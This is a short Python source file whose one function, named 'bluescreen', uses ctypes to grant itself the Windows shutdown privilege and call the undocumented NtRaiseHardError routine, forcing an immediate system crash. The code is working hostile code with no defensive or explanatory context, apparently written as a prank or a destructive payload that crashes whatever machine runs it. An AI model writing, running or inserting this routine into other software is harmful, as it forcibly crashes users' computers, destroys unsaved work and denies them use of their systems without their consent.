import ctypes

def bluescreen():
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
        status = ctypes.windll.ntdll.NtRaiseHardError(
            0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint())
        )
        return f"{status}"
    except Exception as e:
        return str(e)